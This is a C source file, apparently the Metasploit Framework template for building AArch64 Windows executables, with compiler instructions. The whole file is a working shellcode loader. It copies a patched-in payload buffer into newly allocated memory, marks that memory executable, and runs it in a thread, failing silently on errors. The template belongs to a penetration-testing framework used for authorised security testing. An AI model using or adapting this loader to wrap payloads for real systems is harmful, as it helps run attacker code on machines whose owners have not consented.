// AArch64 PE EXE Template for Metasploit Framework
//
// -----------------------------------------------------------------------------
//
// Compilation Instructions:
//
//   Using MSVC on a Windows ARM64 Host:
//
//   cl.exe /nologo /O2 /W3 /GS- /D_WIN64 template_aarch64_windows.c /link ^
//   /subsystem:windows /machine:arm64 /entry:main ^
//   /out:template_aarch64_windows.exe kernel32.lib
//
// -----------------------------------------------------------------------------

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#undef WIN32_LEAN_AND_MEAN

#define PAYLOAD_MARKER "PAYLOAD:"
#define SCSIZE 8192

char payload[SCSIZE] = PAYLOAD_MARKER;

int main(void)
{
    void *exec_mem;
    DWORD old_prot;
    HANDLE hThread;

    // Stage 1: Allocate a block of memory. We request READWRITE permissions
    // initially so we can copy our payload into it.
    exec_mem = VirtualAlloc(NULL, SCSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == NULL)
    {
        // Fail silently if allocation fails.
        return 1;
    }

    // Stage 2: Copy the payload from our data section into the new memory block.
    // A simple loop is used for maximum compiler compatibility and to avoid
    // needing extra headers like <string.h> for memcpy.
    for (int i = 0; i < SCSIZE; i++)
    {
        ((char *)exec_mem)[i] = payload[i];
    }

    // Stage 3: Change the memory's protection flags from READWRITE to
    // EXECUTE_READ.
    if (VirtualProtect(exec_mem, SCSIZE, PAGE_EXECUTE_READ, &old_prot) == FALSE)
    {
        // Fail silently if we cannot make the memory executable.
        return 1;
    }

    // Stage 4: Execute the shellcode.
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    else
    {
        // As a fallback in case CreateThread fails, call the shellcode directly.
        ((void (*)())exec_mem)();
    }

    return 0;
}
